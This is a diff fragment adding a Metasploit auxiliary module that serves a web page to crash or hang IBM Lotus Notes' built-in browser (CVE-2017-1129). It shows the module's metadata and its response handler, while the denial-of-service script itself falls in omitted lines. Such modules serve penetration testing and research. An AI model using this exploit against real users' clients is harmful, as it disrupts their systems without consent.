@@ -1,4 +1,26 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
 
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::HttpServer
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name'           => "IBM Notes encodeURI DOS",
+        'Description'    => %q(
+          This module exploits a vulnerability in the native browser that comes with IBM Lotus Notes.
+          If successful,it could cause the Notes client to hang and have to be restarted.
+		  http://www-01.ibm.com/support/docview.wss?uid=swg21999385
+        ),
+        'License'        => MSF_LICENSE,
+        'Author'         => [
+          'Dhiraj Mishra',
+        ],
+        'References'     => [
           [ 'EXPLOIT-DB', '42602'],
           [ 'CVE', '2017-1129' ]
         ],
@@ -35,3 +57,4 @@ while (true) try {
     send_response(cli, @html)
   end
 end
+
